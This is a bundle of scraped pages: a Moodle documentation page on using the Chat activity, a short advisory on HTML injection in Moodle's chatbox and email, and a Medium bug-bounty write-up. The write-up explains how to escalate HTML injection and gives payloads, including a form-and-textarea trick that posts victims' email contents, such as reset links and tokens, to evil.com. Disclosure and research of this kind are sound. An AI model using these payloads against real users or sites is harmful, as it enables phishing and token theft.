=== Content from docs.moodle.org_281bef04_20250111_143235.html ===

[![Moodle.org](/skin/img/moodle_logo_tm.svg)](https://moodle.org/)

[![Moodle.org](/skin/img/moodle_logo_tm.svg)](https://moodle.org/)

* [Forums](https://moodle.org/course)
* [Documentation](https://docs.moodle.org)
* [Downloads](https://download.moodle.org)
* [Demo](https://moodle.org/demo)
* [Tracker](https://tracker.moodle.org)
* [Development](https://moodledev.io/)
* [Translation](https://lang.moodle.org)
* [Search](https://moodle.org/public/search)

---

* [Search](https://moodle.org/public/search)
* Moodle Sites ![](/skin/img/arrow-r.svg)
* What are you looking for?

  ---

  Learn about Moodle's products, like Moodle LMS or Moodle Workplace, or find a Moodle Certified Service Provider.

  [Moodle.com](https://moodle.com)

  ---

  Our social network to share and curate open educational resources.

  [MoodleNet](https://moodle.net)

  ---

  Courses and programs to develop your skills as a Moodle educator, administrator, designer or developer.

  [Moodle Academy](https://moodle.academy)

![](/skin/img/arrow-left.svg)

[Moodle.com](https://moodle.com)

Learn about Moodle's products, like Moodle LMS or Moodle Workplace, or find a Moodle Certified Service Provider.

---

[MoodleNet](https://moodle.net)

Our social network to share and curate open educational resources.

---

[Moodle Academy](https://moodle.academy)

Courses and programs to develop your skills as a Moodle educator, administrator, designer or developer.

[# Documentation](https://docs.moodle.org)

Menu
[Main page](/403/en/Main_page)[Table of contents](/403/en/Table_of_Contents)[Docs overview](https://docs.moodle.org/overview)[Recent changes](/403/en/Special%3ARecentChanges)

[Log in](/403/en/index.php?title=Special:UserLogin&returnto=Using+Chat "You are encouraged to log in; however, it is not mandatory [o]")

  4.3 docs[4.5 docs](https://docs.moodle.org/405/en/Using_Chat)
[4.4 docs](https://docs.moodle.org/404/en/Using_Chat)

[Article](/403/en/Using_Chat "View the content page [c]")
[Page Comments](/403/en/Talk%3AUsing_Chat "Discussion about the content page [t]")

[View source](/403/en/index.php?title=Using_Chat&action=edit "This page is protected.
You can view its source [e]")
[View history](/403/en/index.php?title=Using_Chat&action=history "Past revisions of this page [h]")

# Using Chat

From MoodleDocsJump to:[navigation](#mw-navigation), [search](#p-search)

[Main page](/403/en/Main_page "Main page") ► [Managing a Moodle course](/403/en/Managing_a_Moodle_course "Managing a Moodle course") ► [Activities](/403/en/Activities "Activities") ► [Chat activity](/403/en/Chat_activity "Chat activity") ► Using Chat
[Chat activity](/403/en/Chat_activity "Chat activity")

* [Chat settings](/403/en/Chat_settings "Chat settings")
* Using Chat
* [Chat FAQ](/403/en/Chat_FAQ "Chat FAQ")

xml encoding="UTF-8"
Note: Chat is due to be removed from standard Moodle. See the discussion [Deprecation of the Chat Tool](https://moodle.org/mod/forum/discuss.php?d=455659).

This page explains how students and teachers can use the [Chat activity](/403/en/Chat_activity "Chat activity") and explores ways to make the most of it in your Moodle course.

## Contents

* [1 Entering the chat](#Entering_the_chat)
* [2 Joining in a chat session](#Joining_in_a_chat_session)
* [3 Chat features](#Chat_features)
* [4 Chat window scrolling](#Chat_window_scrolling)
* [5 Chat reports](#Chat_reports)
* [6 Exporting chat sessions](#Exporting_chat_sessions)
* [7 Why use chat?](#Why_use_chat?)
* [8 Why NOT use chat?](#Why_NOT_use_chat?)
* [9 See also](#See_also)
## Entering the chat

[![CourseChatEntering.png](/403/en/images_en/9/9a/CourseChatEntering.png)](/403/en/File%3ACourseChatEntering.png)

* As you click the chat link on the course page you see two or three options:
  + Click here to enter the chat now - this takes you to the chat using the chosen site default chat method - for example Ajax.
  + Use more accessible interface - this gives a simpler chat room without frames and javascript:

[![AccessibleChat.png](/403/en/images_en/2/2a/AccessibleChat.png)](/403/en/File%3AAccessibleChat.png)

* + View past sessions - if this has been enabled and the user is allowed to view past chat sessions, this takes them to a list of past sessions with links to the chat.

## Joining in a chat session

* In normal view, the screen is in two parts with the participants on the right, the messages on the left and a box at the bottom into which users type their message and press "Send" to make their contribution:

[![Ajax chat screen](/403/en/images_en/thumb/d/d7/Chat01.png/450px-Chat01.png)](/403/en/File%3AChat01.png "Ajax chat screen")

* Users can change the appearance of the messages by clicking on "Themes" next to the "Send" button. Alongside the default course theme, there are two other available themes.
* **\*Note:\*** *Changing theme during a Chat will remove any previous messages.*

'Bubbles' looks like this:

[![](/403/en/images_en/thumb/d/dc/Chat02.png/450px-Chat02.png)](/403/en/File%3AChat02.png) Bubbles theme

'Compact' looks like this:

[![](/403/en/images_en/thumb/f/f7/Chatthemes.png/450px-Chatthemes.png)](/403/en/File%3AChatthemes.png) Compact theme
## Chat features

Smilies
Any smiley faces (emoticons) that you can type elsewhere in Moodle can also be typed in here and they will be displayed correctly. See [Wikipedia list of emoticons](https://en.wikipedia.org/wiki/List_of_emoticons)
Links
Internet addresses will be turned into links automatically.
Emoting
You can start a line with `/me` to emote. For example, if your name is Kim and you type `/me laughs!` then everyone will see "Kim laughs!"
Beeps
You can send a sound to other people by hitting the "beep" link next to their name. A useful shortcut to beep all the people in the chat at once is to type "beep all". Safari users may need to allow sounds for the specific site. Linux users may require a browser plugin to be installed to play sounds.
Talk
If you click the 'Talk' link by a person's name, it will then add their name in the chat box to show your message is directed at that particular person, such as: 'Mary **said to** *Brian Franklin*...'
HTML
If you know some HTML code, you can use it in your text to do things like insert images, play sounds or create different coloured and sized text.
## Chat window scrolling

If the chat method (chat\_method) is set to Ajax in the Site administration (the default setting), then chat window scrolling will stop automatically if you move your mouse away from the chat window.

If the chat method is set to Normal, then there is an auto-scroll checkbox next to the input text box, which you can untick to prevent scrolling.

## Chat reports

* To view previous chats (if you have permission) click on the 'View past chat sessions' link.

Teachers can also access past chat sessions from the gear icon Action menu (Boost theme) or from Course administration (Classic theme.)

[![BoostPastChatSessions.png](/403/en/images_en/8/80/BoostPastChatSessions.png)](/403/en/File%3ABoostPastChatSessions.png)

* This will bring up a listing of each chat session under the current chat topic. The listings include the time the chat started and ended, which users participated, and how many messages each user sent. Individual sessions may be deleted by clicking the 'Delete' link.

[![Chat04.png](/403/en/images_en/thumb/8/83/Chat04.png/450px-Chat04.png)](/403/en/File%3AChat04.png)

Clicking on 'See this session' will display a transcript of that particular chat:

[![](/403/en/images_en/thumb/2/21/Chat05.png/450px-Chat05.png)](/403/en/File%3AChat05.png) Chat transcript

* In order for students to see past sessions, the teacher or an administrator must setup the chat to allow everyone to view past chat sessions. Please refer to the [Chat settings](/403/en/Chat_settings "Chat settings") page.

## Exporting chat sessions

Users with the capabilities to [export chat session which they took part in](/403/en/Capabilities/mod/chat%3Aexportparticipatedsession "Capabilities/mod/chat:exportparticipatedsession") or [export any chat session](/403/en/Capabilities/mod/chat%3Aexportsession "Capabilities/mod/chat:exportsession") can download or export past chat sessions to any portfolio enabled by the administrator. If [Portfolios](/403/en/Portfolios "Portfolios") have not been enabled, then users will not see a link to "Export" chat sessions.

[![ExportChat.png](/403/en/images_en/6/67/ExportChat.png)](/403/en/File%3AExportChat.png)

## Why use chat?

* Chat has an advantage over a [Forum](/403/en/Forum "Forum") in that it takes place in Real Time. It is especially beneficial when the group chatting is not able to meet face to face. Examples might be:
  + Regular meetings of staff on large or split campuses to discuss student or curriculum issues;
  + Regular meetings of students doing online courses to enable them to share experiences with others on the same course but potentially in a different city (or country)
  + A teacher working with his students even though he is out of school
  + A student temporarily unable to attend in person chatting with their tutor to catch up with work.
  + Students out on work experience getting together to discuss their experiences with each other and their tutor
  + Younger children using chat at home in the evenings as a controlled(monitored) introduction to the world of social networking

## Why NOT use chat?

* Unless a tutor/moderator is permanently present in the chatroom -or unless the chat is hidden and revealed at certain times, it is difficult to control what is said once a chat has started.
* Younger students particularly may find it difficult to stay on task and be prone to adding non-useful comments or "beeping" others for the sake of it.
* In some situations, a forum might be preferred as it allows for reflection before posting and gives a period of time where the post might be edited.

## See also

[Working example of Chat from the School demo site.](https://school.moodledemo.net/mod/chat/view.php?id=162) Log in with username "student" and password "moodle" to try out the chat. You might be chatting to yourself though:)

Retrieved from "<https://docs.moodle.org/403/en/index.php?title=Using_Chat&oldid=138283>"

[Category](/403/en/Special%3ACategories "Special:Categories"):

* [Chat](/403/en/Category%3AChat "Category:Chat")

Tools
[What links here](/403/en/Special%3AWhatLinksHere/Using_Chat "A list of all wiki pages that link here [j]")
[Related changes](/403/en/Special%3ARecentChangesLinked/Using_Chat "Recent changes in pages linked from this page [k]")
[Special pages](/403/en/Special%3ASpecialPages "A list of all special pages [q]")
Printable version
[Permanent link](/403/en/index.php?title=Using_Chat&oldid=138283 "Permanent link to this revision of this page")
[Page information](/403/en/index.php?title=Using_Chat&action=info "More information about this page")

In other languages
[Čeština](https://docs.moodle.org/cs/Chatovac%C3%AD_zased%C3%A1n%C3%AD "Chatovací zasedání – čeština")
[Deutsch](https://docs.moodle.org/de/Chat_nutzen "Chat nutzen – Deutsch")
[Español](https://docs.moodle.org/es/Usando_Chat "Usando Chat – español")
[Français](https://docs.moodle.org/fr/Participer_%C3%A0_un_chat "Participer à un chat – français")

 This page was last edited on 31 August 2020, at 16:26.
Content is available under [GNU General Public License](https://docs.moodle.org/dev/License) unless otherwise noted.

[Privacy](/403/en/MoodleDocs%3APrivacy)
[About Moodle Docs](/403/en/MoodleDocs%3AAbout)
[Disclaimers](/403/en/MoodleDocs%3AGeneral_disclaimer)

[![Powered by MediaWiki](/403/en/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from gist.githubusercontent.com_f56b01a5_20250111_143235.html ===
[Summary]
An issue in Moodle v.4.3.3+ allows a remote attacker to execute arbitrary code via a crafted script to the Chatbox email component.
[Impact]
An attacker could:
+ Modify the HTML codes of the user interface with any malicious content including phishing content to gain the victim's credentials and for further attack scenarios. In this case, the chat box is a highly sensitive area! It can lead to a lot of risks for users, such as inserting an tag that users can click on and redirect, as well as inserting numerous ![]() tags. When messaging in Moodle, the email will be sent to the victim's side. From there, it also can lead to Email HTML Injection(Content Spoofing) it can be used for phishing, spamming, etc.
+ Injecting multiple HTML tags with nested functions can lead to system denial of service (DOS). Try injecting tags that are prone to DOS attacks. It could potentially DOS everyone receiving the messages, making them unable to access the server.
[Attack Vectors]
1. Log into the chat box -> path -> /message/ and message anyone
2. Injecting HTML tags, the simplest one being
# minendie

giongfnef
3. Observed server response -> completely vulnerable to HTML injection in both chat box message and Email HTML Injection through email

=== Content from medium.com_4c002c63_20250111_143236.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fe7171efd88fe&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40lamscun%2Fhow-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40lamscun%2Fhow-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# How do I change HTMLi from Low to Critical? Is your mailbox safe?

[![lamscun](https://miro.medium.com/v2/resize:fill:88:88/1*UHWV8iKjsBf_3eL_I93tpQ.png)](/%40lamscun?source=post_page---byline--e7171efd88fe--------------------------------)

[lamscun](/%40lamscun?source=post_page---byline--e7171efd88fe--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F8220f1c83006&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40lamscun%2Fhow-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe&user=lamscun&userId=8220f1c83006&source=post_page-8220f1c83006--byline--e7171efd88fe---------------------post_header-----------)

6 min read·Oct 6, 2023

--

2

Listen

Share

In this post, I’m just sharing how I increased the impact of regular HTMLi bugs from Low to Medium, High and even **Critical** impact.

![]()

Normally, I you have tried everything but can not exploit you HTMLi bug to **XSS, SSRF, SSTI, etc**,… You have to ignore this bug or try to report with low impact. I even have a lot report HTMLi rejected with **Information** status :((

![]()

I was trying to find anoter way to exploit this bug to increase its impact, here are some of the ways I used:

# **1. From Low to Medium, High impact by: “class”**

If the application only accept your input with the basic html tags such as: <a>, <img>, <p>, <div>, <br>,… You can report it but I’m sure your report only get the low bounty.

I had reported some bugs with this normal html injection payload: `<a href='https://attacker_domain'>CLICK HERE</a>` and of course it **only get the low bounty**

![]()![]()

But after that I found that I could increase the impact to Medium. That is, if you can create a **layer mask** with your html code, this **layer mask** will completely **cover full** of the current page, then obviously the availability will be raised to low, or even high. And to popup a full screen **layer mas k** you can use this simple payload:

`<a href='https://attacker_domain'><img src=layer_mask_image style='position:fixed; top:0; left: 0; width: 100%'></a>``

![]()

This payload will work if you could control the `**style**` for these basic tags.

To control style in html code, people will usually insert the tag `<style>` or or insert the `style` attribute (ex: <a style=’….’>) , and **this <style> tag or `style` attribute is also very often blocked, removed or filtered** only for basic properties such as width, height, … (ex: <a style=’height: 100px;’>).

![]()

How do I control the style in a basic html **without editable js, css, <style>, ‘style’ attribute ??????**

→ Yeah!!!! I have another way :)) that is using the ‘**CLASS’** or ‘**ID’** attribute.

Normal libraries will not remove or filter this ‘**class**’ or ‘**id**’ attribute, how amazing??
I realize that a website always has many **.css** files with pre-defined styles for `**class**`, so we just need to find the correct class name that has `**position:fixed**` , `**top:0`** , `**width: 100%**` . I call this method is **Style Gadget Attack** — **SGA**

![]()![]()

Allways has a lot of .css files in a website. Take advantage of it :D

And it’s not difficult to find the classes for the gadget we want above (`**position:fixed**` , `**top:0`** , `**width: 100%**`)

![]()![]()

Especially, if the page use the [**bootstrap**](https://getbootstrap.com/docs/4.0/components/modal/) this simple use the class ‘**modal**’ , ‘**shadow-modal’**, ...

![]()

Depending on the location you inject the html into, maybe comment in main page of inbox chat,… the impact of this SGA technique will be medium or high because it affects to the `availability` of the page for another user of all users.

# **2. From Low to High, Critical impact by sending email.**

![]()![]()

**Your mail box is safe ????????**

I have many HTMLi reports in email, usually it allow attacker control content of the email which sent from a valid domain to any victim's email. And of course, it only gets a low bounty of N/A because it’s like a spam with no further impact :(((((

![]()

After some research, I discovered that the email provider (**Gmail, Outlook, Zoho,…**) allow us to inject the **<form>** tag as a valid tag. Great, I thought about injecting a Login Form to trick victim input his user, password,.. yes It is still considered spam and is still Low impact, Low bounty. :((((

After reporting and being closed many times, it was so annoying that I tried and found a way to increased the impact of type this bug. I realized that if I could only inject into the content of victim's email, it would have low impact, but if **I could get the content of this emails** (the content of email normally includes token, reset pass, otp, … ) as well, then clearly its impact would be too serious.

Normally you will be able to insert html into the user name, group name, company name, etc.. into the email as shown below, and have you ever thought you would be able to get other content in the email like victim's “Activate victim’s link is as shown below. Yes I can do it by my simple payload.

![]()

As I said above, the email box allows us to insert the <**form**> tag, which means we will be able to send information from this form, so how can we get the content inside email sent to the victim

I realized the interesting thing about the **<textarea>** tag (it is also a valid tag allowed in emails), ***all html content following it will be turned into text and attached to the content, contained in a previous form tag.***

![]()

The above completely works with Gmail, Outlook, …

![]()

Victim click to Login button, his active link will be sent to attacker’s domain.

![]()
# **Summary:**

You can use a basic html injection with higher impact, and get secret key tokens, reset link, etc. not only in emails but also on any page where you insert html (I have had many reports with high, critical impact with this method) with the payloads below:

- For create layer mask:

`<a href='evil.com'><img src='img_link' class='SGA_class ..' ></a>...`

- For obtain content page, email:

`<form action='//evil.com'><button type='submit'><textarea name='x'>...`

In reality, I have a lot of case need to bypass base on sample payload blow. Feel free to contact me if you need to collaborate to exploit similar types of bugs

@lamscun (<https://hackerone.com/lamscun> , <https://twitter.com/lamscun>)

@flyseccorp (<https://www.flyseccorp.com/> , <https://twitter.com/flysec_corp>)

[HTML](/tag/html?source=post_page-----e7171efd88fe--------------------------------)[Hacking](/tag/hacking?source=post_page-----e7171efd88fe--------------------------------)[Bugbounty Writeup](/tag/bugbounty-writeup?source=post_page-----e7171efd88fe--------------------------------)

--

--

2

[![lamscun](https://miro.medium.com/v2/resize:fill:96:96/1*UHWV8iKjsBf_3eL_I93tpQ.png)](/%40lamscun?source=post_page---post_author_info--e7171efd88fe--------------------------------)[![lamscun](https://miro.medium.com/v2/resize:fill:128:128/1*UHWV8iKjsBf_3eL_I93tpQ.png)](/%40lamscun?source=post_page---post_author_info--e7171efd88fe--------------------------------)Follow[## Written by lamscun](/%40lamscun?source=post_page---post_author_info--e7171efd88fe--------------------------------)[73 Followers](/%40lamscun/followers?source=post_page---post_author_info--e7171efd88fe--------------------------------)·[12 Following](/%40lamscun/following?source=post_page---post_author_info--e7171efd88fe--------------------------------)Follow
## Responses (2)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----e7171efd88fe--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----e7171efd88fe--------------------------------)[About](/about?autoplay=1&source=post_page-----e7171efd88fe--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----e7171efd88fe--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----e7171efd88fe--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----e7171efd88fe--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----e7171efd88fe--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----e7171efd88fe--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----e7171efd88fe--------------------------------)[Teams](/business?source=post_page-----e7171efd88fe--------------------------------)


